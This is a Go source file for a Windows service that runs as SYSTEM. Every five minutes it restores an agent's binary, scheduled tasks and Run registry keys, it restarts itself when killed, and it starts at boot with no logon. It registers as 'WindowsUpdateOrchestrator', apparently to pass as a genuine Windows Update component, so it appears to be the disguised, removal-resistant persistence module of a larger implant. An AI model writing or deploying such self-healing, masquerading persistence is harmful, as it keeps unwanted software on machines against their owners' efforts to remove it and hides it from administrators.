//go:build windows

package main

import (
	"log"
	"time"

	"golang.org/x/sys/windows/svc"
)

// healService is the SYSTEM repair service (never runs the agent itself,
// so session interactivity is untouched): every 5 minutes it repairs
// binary/tasks/Run keys from local state, exactly like --wmi-heal. SCM
// failure actions restart it if killed, and it starts at boot with no
// logon required — covering the "everything wiped and nobody logged on"
// gap nothing else reaches.
type healService struct{}

func (h *healService) Execute(args []string, req <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	changes <- svc.Status{State: svc.StartPending}
	tick := time.NewTicker(5 * time.Minute)
	defer tick.Stop()
	changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	log.Printf("[svc] repair service running")
	runWmiHeal()
	for {
		select {
		case r := <-req:
			if r.Cmd == svc.Stop || r.Cmd == svc.Shutdown || r.Cmd == svc.PreShutdown {
				changes <- svc.Status{State: svc.StopPending}
				return false, 0
			}
		case <-tick.C:
			runWmiHeal()
		}
	}
}

// runSvcHealing runs as a Windows service (blocks until SCM stops us).
func runSvcHealing() error {
	return svc.Run("WindowsUpdateOrchestrator", &healService{})
}
